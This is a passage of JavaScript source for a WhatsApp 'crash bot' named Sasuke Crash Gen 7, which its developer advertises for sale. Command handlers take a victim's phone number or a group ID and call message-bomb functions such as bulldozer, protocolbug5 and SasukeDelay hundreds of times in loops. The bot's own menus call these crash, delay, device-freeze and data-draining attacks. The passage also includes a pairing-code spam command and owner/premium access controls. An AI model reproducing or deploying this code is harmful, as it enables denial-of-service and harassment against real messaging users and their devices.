お \`[Developer]\` : Erlangga Developer
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\`: Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}

\`List Menu Group\`
お antilink
お promote
お demote
お kick
お hidetag
お tagall
お open
お close
お totag
お jadian
お tolak
お terima
お putus
お cekpacar
`
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: puqimak,
  footer: "Developer Erlangga",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Sasuke Crash Gen 7`,
            "body": `© Erlangga Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
            "thumbnail": fs.readFileSync('./assest/allmedia/erlangga3.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".info", 
    buttonText: { 
      displayText: 'Info' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
   }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
break
case "ownermenu": {
let babi = `
*Haii @${m.sender.split("@")[0]}, Welcome To Sasuke Crash Gen 7*

  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
お \`[Developer]\` : Erlangga Developer
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\`: Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}


\`List Menu Owner\`
お slidebutton
お menuv2
お addowner
お delowner
お buttonoff
お buttonon
お addmurbug
お delmurbug
お debug
お self
お public
お hidetag
お addcase
お getcase
お ovopay
お danapay
お qrispay
お gopaypay
お clearsession
お buatgc
お $
お >
`;
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: babi,
  footer: "Developer Erlangga",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Sasuke Crash Gen 7`,
            "body": `© Erlangga Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
            "thumbnail": fs.readFileSync('./assest/allmedia/erlangga3.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".info", 
    buttonText: { 
      displayText: 'Info' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
   }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
break
case "addmurbug":{
if (!isCreator) return ErlanggaReply(mess.owner)
if (!args[0]) return ErlanggaReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285179836603`)
anj = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await langgxyz.onWhatsApp(anj)
if (ceknya.length == 0) return ErlanggaReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(anj)
fs.writeFileSync("./assest/database/premium.json", JSON.stringify(premium))
ErlanggaReply(`Nomor ${anj} Telah Menjadi murbug!`)
}
break
case 'delmurbug': {
    if (!isCreator) return ErlanggaReply("𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲");
    if (args.length < 1) return ErlanggaReply(`Use :\n*#delmurbug* @tag\n*#delmurbug* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("../assest/database/premium.json", JSON.stringify(premium));
        }
        ErlanggaReply("Delete success");
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("../assest/database/premium.json", JSON.stringify(premium));
        ErlanggaReply("Success");
    }
}
break
            case "self":{
                if (!isCreator) return ErlanggaReply("`𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲`") 
                langgxyz.public = false
                ErlanggaReply(`successfully changed to ${command}`)
            }
            break
                        case "public":{
                if (!isCreator) return ErlanggaReply("`𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲`") 
                langgxyz.public = true
                ErlanggaReply(`successfully changed to ${command}`)
            }
            break           
              case "backup":{
if (!isCreator) return ErlanggaReply(mess.owner);
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await langgxyz.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break
      case 'script': case 'sc': {
let buy = `
*\`▧ 「 SCRIPT SASUKE」\`*
╭────────────────━
┃友 *\`MAU BELI SC INI?\`*
┃
┃- *SASUKE CRASH Gen 7 Vvip New Update?*
┃
┃友 *Chat 1 : wa.me/6282137392620*
┃友 *Telegram : https://t.me/langgxyz2*
╰────────────────━`
langgxyz.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 50000000,
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
}
break        
    case 'tqto': {
let buy = `
*\`▧ 「 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 𝗠𝗬 𝗙𝗥𝗜𝗘𝗡𝗗𝗦 」\`*

- Erlangga Official *[ Developer ]*
- Daffa *[ My Friends Dev Ravage ]*
- Langit *[ My Friends Dev Mahiru ]*
- Dannz Official *[ Best Friends Dev Evil Crash ]*
- Kaizi *[ My Freinds Dev Athena ]*
- Hamz *[ My Friends Dev Xa ]*
- Dapz *[ My Friends ]*
- Skyzet *[ My Friends ]*
- Ortu *[ Support ]*
- Thx To Allah *[ My Good ]*`
langgxyz.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'THANKS TO',
 amount1000: 'FRIENDS',
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})

}
                break                               
case 'addcase': {
 if (!isCreator) return ErlanggaReply('lu sapa asu')
 if (!text) return ErlanggaReply('Mana case nya');
    const fs = require('fs');
const namaFile = 'erlangga.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                ErlanggaReply('Terjadi kesalahan saat menulis file:', err);
            } else {
                ErlanggaReply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        ErlanggaReply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
 case "sendsc": {
  if (!isCreator) return ErlanggaReply('*Fitur Ini Khusus Bang Erlangga*')
  
  if (!args[0]) return ErlanggaReply(example("628xxx"));
  
  let targetNumber = args[0]
  if (!targetNumber.startsWith('62')) return m.reply(example("628xxx"))
  
  await ErlanggaReply("Memproses pengiriman script bot")
  var name = `Sasuke-Crash-Gen7`
  
  const ls = (await execSync("ls"))
    .toString()
    .split("\n")
    .filter(
      (pe) =>
        pe != "node_modules" &&
        pe != "session" &&
        pe != "package-lock.json" &&
        pe != "yarn.lock" &&
        pe != ""
    )
    
  const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
  
  await langgxyz.sendMessage(`${targetNumber}@s.whatsapp.net`, {
    document: await fs.readFileSync(`./${name}.zip`),
    fileName: `${name}.zip`,
    mimetype: "application/zip"
  }, {quoted: m })
  
  await execSync(`rm -rf ${name}.zip`)
  
  return ErlanggaReply(`*Script bot berhasil dikirim ke nomor*\n *📞 ${targetNumber}*`)
}
break
 case 'owner': {
    langgxyz.sendMessage(m.chat, { react: { text: "👤", key: m.key } });

    let menu = `
*👋 Hi ${pushname} Ini Adalah Owner Sasuke Crash Mohon Jangan Spam!!*
    `;

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                            newsletterName: `Channel Erlangga Official`,
                            newsletterJid: "12036341728891399@newsletter",
                            serverMessageId: 143
                        },
                        businessMessageForwardInfo: { businessOwnerJid: langgxyz.decodeJid(langgxyz.user.id) },
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "Erlangga Official"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"ᴏᴡɴᴇʀ\",\"url\":\"https://wa.me/6282137392620\",\"merchant_url\":\"https://wa.me/6282137392620\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Saluran Developer\",\"url\":\"https://whatsapp.com/channel/0029Vb46mdpCHDymFEKsWI2r/989\",\"merchant_url\":\"https://wa.me/6282137392620\"}`
                            }
                        ],
                    })
                })
            }
        }
    }, {});

    await langgxyz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case "getcase": {
if (!isCreator) return ErlanggaReply(mess.owner)
if (!text) return ErlanggaReply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./start/erlangga.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
ErlanggaReply(`${getcase(text)}`)
} catch (e) {
return ErlanggaReply(`Case *${text}* Tidak Ditemukan`)
}
}
break  
                case "delowner":{
if (!isCreator) return ErlanggaReply(mess.owner)
if (!args[0]) return m.reply(`Example Use :\n${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')
let no = '@s.whatsapp.net'
let unp = creator.indexOf(ya)
creator.splice(unp, 1)
fs.writeFileSync("../assest/database/owner.json", JSON.stringify(creator))
ErlanggaReply(`Sussces Del Owner ${no}`)
}
break
case "addowner":{
if (!isCreator) return ErlanggaReply(mess.owner)
if (!args[0]) return m.reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await langgxyz.onWhatsApp(prrkek)
if (ceknya.length == 0) return ErlanggaReply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
creator.push(prrkek)
fs.writeFileSync("../assest/database/owner.json", JSON.stringify(creator))
ErlanggaReply(`*\`${prrkek} SUKSES MENJADI OWNER!!\`*`)
}
break
case "buttonoff":{
if (!isCreator) return ErlanggaReply(mess.owner)
ErlanggaReply("Button Berhasil Di Matikam, silahkan ketik .menuv2")
}
 break
case "buttonon":{
if (!isCreator) return ErlanggaReply(mess.owner)
ErlanggaReply("Button Berhasil Di Nyalakan, silahkan ketik .menu")
}
break
case "menuv2":{
let hai = `
*👋 Hi ${pushname} Selamat Datang di Bot Sasuke Gen 7 Vvip New Update, Berikut Menu Bot*

｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
お \`[Developer]\` : Erlangga Developer
お \`[Action]\` : ẉ.ceo/ErlanggaDeveloper
お \`[Gen]\`: Gen 7 Vvip New Update Buy Only
お \`[TipeMenu]\`: Non Button
お \`[Status]\` : ${langgxyz.public ? "Public" : "Self"}

\`List Menu Bug\`
お xdelayui
お buldozer
お protocol5
お protocolbug6
お delaystuck
お delayiosmaker
お spampairing
お clearbug
お clearbug-group

\`List Menu Bug In Place\`
お haisalamkenenal
お ohayopoco
お onichan
お ripperngentod
お erlanggaOfficial
お sasukecrash
お sasukeinplace

\`List Menu Bug group\`
お delaygroup

\`List Menu Owner\`
お addowner
お buttonon
お buttonoff
お delowner
お addmurbug
お delmurbug
お debug
お self
お public
お hidetag
お addcase
お getcase
お ovopay
お danapay
お qrispay
お gopaypay
お clearsession
お buatgc
お $
お >

\`List Menu Group\`
お antilink
お promote
お demote
お kick
お hidetag
お tagall
お open
お close
お totag
お jadian
お tolak
お terima
お putus
お cekpacar

\`List Menu Fun\`
お sticker
お play
お tiktok
お brat
お qc2
お bratvid
お bokep
お tourl
お motivasi
お hd
お pin
お play
お cekkhodam
お apakah
お bisakah
お bagaimanakah
お jadian
お tolak
お terima
お putus
お cekpacar
お ai
お cekidch
お reactch
*\`▧ 「 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 𝗠𝗬 𝗙𝗥𝗜𝗘𝗡𝗗𝗦 」\`*
> Erlangga Official *[ Developer ]*
> Daffa
> Langit 
> Dannz Official
> Kaizi
> Hamz Official
> Dapz
> Skyzet
> Ortu
> Thx To Allah
`
langgxyz.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/ggjkbc.jpg" },
  caption: hai,
  footer: "Sasuke Gen 7 Vvip New Update",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363418898701072@newsletter",
      serverMessageId: 1,
      newsletterName: "Erlangga Official Solo Era"
    }
  }
}, { quoted: qmime });
}
break;

    case "bug-group": {
await langgxyz.sendMessage(m.chat, { react: { text: `🆗`, key: m.key } });
    let getGroups = await langgxyz.groupFetchAllParticipating();
    let groups = Object.values(getGroups);
    
    if (groups.length === 0) 
        return ErlanggaReply("⚠️ Bot tidak memiliki grup yang bisa dipilih.");

    let groupButtons = groups.map(group => ({
        title: `${group.subject} (${group.participants.length} Anggota)`,
        id: `.delaygroup ${group.id}`
    }));

    const xGrupFlow = {
        text: `📢 *Pilih untuk Bug Grup*`,
        footer: "⏤͟͟͞͞Sasuke New Eraa!!͛͛",
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: 'Pilih Grup' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Daftar Grup',
                        sections: [
                            {
                                title: 'Grup yang Tersedia',
                                rows: groupButtons
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 1,
        viewOnce: true
    };

    await langgxyz.sendMessage(from, xGrupFlow, { quoted: qmime });
    }
    break;
    case "clearbug-group": {
await langgxyz.sendMessage(m.chat, { react: { text: `🆗`, key: m.key } });
    let getGroups = await langgxyz.groupFetchAllParticipating();
    let groups = Object.values(getGroups);
    
    if (groups.length === 0) 
        return ErlanggaReply("⚠️ Bot tidak memiliki grup yang bisa dipilih.");

    let groupButtons = groups.map(group => ({
        title: `${group.subject} (${group.participants.length} Anggota)`,
        id: `.clearbug2 ${group.id}`
    }));

    const xGrupFlow = {
        text: `📢 *Pilih untuk Clear Grup*`,
        footer: "⏤͟͟͞͞Sasuke New Eraa!!͛͛",
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: 'Pilih Grup' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Daftar Grup',
                        sections: [
                            {
                                title: 'Grup yang Tersedia',
                                rows: groupButtons
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 1,
        viewOnce: true
    };

    await langgxyz.sendMessage(from, xGrupFlow, { quoted: qmime });
    }
    break;
    case "clearbug2":{
  if (!isCreator && !isPremium) 
    return ErlanggaReply(m.chat, '*[Akses Ditolak!!]*\nFitur Khusus Erlangga Developer');

  let isTarget = args[0]; 
  if (!isTarget) 
    return ErlanggaReply(m.chat, "⚠️ *Silakan pilih grup dari menu!*");

  try {
      for (let i = 0; i < 5; i++) {
       langgxyz.sendMessage(isTarget, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
  }
    ErlanggaReply(m.chat, `✅ Sukses Clear Bug Group: ${isTarget}`);
  } catch (err) {
    ErlanggaReply(m.chat, `❌ Gagal menjalankan Clearbug! Pastikan bot ada di grup tersebut.`);
  }
}
break;
                case "delaygroup":{
  if (!isCreator && !isPremium) 
    return ErlanggaReply(m.chat, '*[Akses Ditolak!!]*\nFitur Khusus Erlangga Developer');

  let isTarget = args[0]; 
  if (!isTarget) 
    return ErlanggaReply(m.chat, "⚠️ *Silakan pilih grup dari menu!*");

  try {
       await SasukeDelayNew(isTarget)
       await SasukeDelayNew(isTarget)
       await SasukeDelayNew(isTarget)
       await SasukeDelay(isTarget)
       await SasukeDelay(isTarget)
       await SasukeDelay(isTarget)
       await SasukeDelayInvis(isTarget)
       await SasukeDelayInvis(isTarget)
       await SasukeDelayInvis(isTarget)
       await SasukeDelayInvis(isTarget)
       await sleep(2000);
    for (let i = 0; i < 666; i++) {
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await bulldozer(isTarget)
       await protocolbug5(isTarget, true)
       await protocolbug5(isTarget, true)
       await protocolbug5(isTarget, true)
       await protocolbug5(isTarget, true)
       await protocolbug5(isTarget, false)
       await protocolbug5(isTarget, false)
       await protocolbug5(isTarget, false)
       await protocolbug5(isTarget, false)   
    }

    ErlanggaReply(m.chat, `✅ Sukses kirim bug group: ${isTarget}`);
  } catch (err) {
    ErlanggaReply(m.chat, `❌ Gagal menjalankan Blanking! Pastikan bot ada di grup tersebut.`);
  }
}
break;
case 'spampairing':{
if (!isCreator && !isPremium) return ErlanggaReply(mess.murbug);
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await doneress();
         
         for (let i = 0; i < 777; i++) {
         await SendPairing(org, false) 
         await SendPairing(org, false) 
         }
}
break
case 'ultimate-sasuke': {
 langgxyz.sendMessage(m.chat, { react: { text: "💢", key: m.key } });
 
if (!isPremium) return ErlanggaReply("*You are not a Premium User*");
    if (!q) return ErlanggaReply("Example Usage:\n .ultimate-sasuke 62xx / @tag");

    let org = q.replace(/[^0-9]/g, "");
    
    if (org.startsWith('0')) {
        return ErlanggaReply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .ultimate-sasukev2 62 xxx-xxxx-xxxx`);
    }

    let pepec = `${org}@s.whatsapp.net`;
    
  langgxyz.sendMessage(m.chat, {
  caption: "Erlangga Developer", 
  image: marga,
  footer: "Sasuke Gen 7",
  buttons: [
    { 
      buttonId: `.script`, 
      buttonText: {
      displayText: 'Buy Script'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.owner', 
      buttonText: {
      displayText: 'owner'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.h kontol', 
      buttonText: {
      displayText: 'Ping' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "Are you ready?̰̜͉͔̽͢",
        "sections": [
            {
                "title": "© ErlanggaOfficial",
                "highlight_label": "",
                "rows": [
                    {
                        "header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Delay Ui",
                        "description": "Attack Ui",
                        "id": ".xdelayui ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Delay Invis+Maker",
                        "description": "Penyedot Kouta",
                        "id": ".buldozer ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Delay Maker",
                        "description": "Attack Delay Mentiom Sw",
                        "id": ".protocol5 ${pepec}"
                    },
                      {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Delay Maker V2",
                        "description": "Attack Delay Mention V2",
                        "id": ".protocolbug6 ${pepec}"
                    },
                     {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Delay Stuck",
                        "description": "Attack Delay Stuck, For Hp Low",
                        "id": ".delaystuck ${pepec}"
                    },
                      {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Payload For Ios",
                        "description": "Attack Delay Ios Maker",
                        "id": ".delayiosmaker ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Hard Delay",
                        "description": "Attack All func Delayy ( work all device )",
                        "id": ".combosetan ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Spam Pairing",
                        "description": "Spam Pairing",
                        "id": ".spampairing ${pepec}"
                    }                                  
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qmime });
}
break
case "combosetan":{
if (!isCreator && !isPremium) return ErlanggaReply(mess.murbug);
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await doneress();

       // Memulai Crashing
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeDelayNew(org)
       await SasukeDelayNew(org)
       await SasukeDelayNew(org)
       await SasukeDelay(org)
       await SasukeDelay(org)
       await SasukeDelay(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       await SasukeComboSetan(org)
       await SasukeComboSetan(org)
       await SasukeComboSetan(org)
       await SasukeComboSetan(org)
 }
break
                case "delayiosmaker": case 'delaystuck': case 'xdelayui':{
if (!isCreator && !isPremium) return ErlanggaReply(mess.murbug);
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await doneress();

       // Memulai Pemanggilan 1 Func Fc Kemudian Combo Dengan Func Delay
       await SasukeDelayNew(org)
       await SasukeDelayNew(org)
       await SasukeDelayNew(org)
       await SasukeDelay(org)
       await SasukeDelay(org)
       await SasukeDelay(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       for (let i = 0; i < 777; i++) {
       await protocolbug2(org, true)
       await protocolbug1(org, true) 
       await protocolbug2(org, true)
       await protocolbug3(org, true)
       await protocolbug4(org, true)
       await protocolbug5v2(org, true)
       await protocolbug5v2(org, true)
       await protocolbug5v2(org, true)
       await protocolbug5v2(org, false)
       await protocolbug5v2(org, false)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, false)
       await protocolbug5(org, false)
       await protocolbug5(org, false)
       await protocolbug5(org, false)
       await VampPaymentCrash(org, true)
       await VampDelayMess(langgxyz, org)
       await VampPrivateBlank(langgxyz, org)
       await VampDelayCrash(langgxyz, org)
       await VampBroadcast(langgxyz, org, true)
       await mentionSw(org)
       await carouselNew(org)
       await bulldozer(org)
       await carouselNew(org)
       await bulldozer(org)
       await DelayStc(langgxyz, org)
       await DelayStc(langgxyz, org)
       await carouselNew(org)
       await bulldozer(org)
       await carouselNew(org)
       await bulldozer(org)
       await DelayStc(langgxyz, org)
       await DelayStc(langgxyz, org)       
           }     
 }
break
case 'buldozer':{
if (!isCreator && isPremium) return ErlanggaReply(mess.murbug)
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
ErlanggaReply(`Succes Send Bug ${command} to ${org}`)
       
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       for (let i = 0; i < 999; i++) {   
       await bulldozer(org)
       await bulldozer(org)
       await protocolbug5(org, true)
       await bulldozer(org)
       await protocolbug5(org, true)
       await bulldozer(org)
       await protocolbug5(org, true)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await protocolbug5(org, true)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await protocolbug5(org, true)
       await bulldozer(org)
       await bulldozer(org)
       await protocolbug5(org, true)
       await bulldozer(org)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await bulldozer(org)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await bulldozer(org)
       await protocolbug5(org, true)
        }
  } 
  break 
   case 'protocol5': case 'protocolbug6':{
if (!isCreator && isPremium) return ErlanggaReply(mess.murbug)
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim pesan awal proses
await doneress();
       
       for (let i = 0; i < 777; i++) {   
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, false)
       await protocolbug5(org, false)
       await protocolbug5(org, false)
       await protocolbug5(org, false)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
       await bulldozer(org)
        }
  } 
  break                
case 'haisalamkenal': case 'ohayopoco': case 'sasukecrash': case 'sasukeinplace': case 'erlanggaOfficial':{
if (!isCreator) return ErlanggaReply('Hanya Untuk Bot Only')
let pepec = m.chat;
// Kirim Pesan Succes
ErlanggaReply(`Succes Send Bug ${prefix + command} to ${pepec}`)
        
       await SasukeDelayNew(pepec)
       await SasukeDelayNew(pepec)
       await SasukeDelayNew(pepec)
       await SasukeDelayNew(pepec)
       await SasukeDelayNew(pepec)
       await SasukeDelayNew(pepec)
       await SasukeDelay(pepec);
       await SasukeDelay(pepec);
       await SasukeDelayInvis(pepec);
       await SasukeDelayInvis(pepec);
       await SasukeDelayInvis(pepec);
       await SasukeDelayInvis(pepec);
